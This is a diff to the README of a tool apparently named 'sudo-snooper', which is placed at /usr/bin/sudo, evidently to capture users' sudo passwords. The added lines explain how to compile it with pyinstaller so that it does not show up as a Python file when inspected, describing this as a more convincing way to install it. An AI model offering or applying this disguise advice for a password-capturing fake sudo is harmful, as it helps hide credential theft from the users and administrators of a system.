@@ -33,6 +33,10 @@ sudo = 'sudo'
 
   You can go fancy here and make a non-readable executable file for users, but I'm not going into that. Check some of the answers [here](http://unix.stackexchange.com/questions/16623/file-permission-execute-only) for that.
 
+**NOTE**: A somewhat more convincing way to install this is to compile it using `pyinstaller` so that it doesn't show up as a python file when `file /usr/bin/sudo` is executed.
+
+To do that under Archlinux: `pyinstaller --onefile sudo-snooper.py` will work. However please note that once compiled you won't be able to change the parameters in the compiled binary.
+
 
 ## Usage:
 
